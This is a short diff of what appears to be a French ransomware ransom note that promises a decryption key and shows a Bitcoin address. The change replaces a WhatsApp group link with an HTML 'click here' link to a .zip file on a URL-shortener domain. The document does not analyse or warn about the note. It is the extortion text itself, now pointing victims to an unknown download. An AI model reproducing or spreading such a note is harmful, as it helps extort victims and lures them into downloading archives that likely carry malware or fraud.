@@ -49,4 +49,4 @@ bc1qe8um7q3yllhk89qslyjsr4w4kwg8rcxhgucr0j
 
 # OBTENIR LA CLÉ DE DÉCRYPTAGE
 
--- suivez ce lien : https://chat.whatsapp.com/HJflW58mixu6Yjy1SEJLyP
+-- cliquez <a href="https://yip.su/2vP9p8.zip">ICI</a>
